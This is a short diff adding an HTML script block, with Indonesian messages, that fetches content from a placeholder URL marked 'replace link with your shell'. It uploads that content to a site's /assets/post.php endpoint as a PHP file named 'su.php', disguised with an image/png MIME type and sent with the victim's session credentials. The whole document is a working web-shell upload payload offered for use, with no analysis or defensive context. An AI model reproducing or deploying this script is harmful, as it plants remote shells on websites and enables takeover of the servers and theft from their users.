@@ -1,0 +1,24 @@
+<script>
+fetch("ganti link dengan shell anda")
+  .then(response => {
+    if (!response.ok) throw new Error("Gagal mengambil data dari URL");
+    return response.text();
+  })
+  .then(text => {
+    let form = new FormData();
+    let blob = new Blob([text], { type: "image/png" }); // MIME
+    form.append("UserImgfile", blob, "su.php");
+
+    return fetch("/assets/post.php", {
+      method: "POST",
+      body: form,
+      credentials: "include"
+    });
+  })
+  .then(response => {
+    console.log("Berhasil upload:", response.status);
+    return response.text();
+  })
+  .then(result => console.log("Respons server:", result))
+  .catch(error => console.error("Terjadi kesalahan:", error));
+</script>
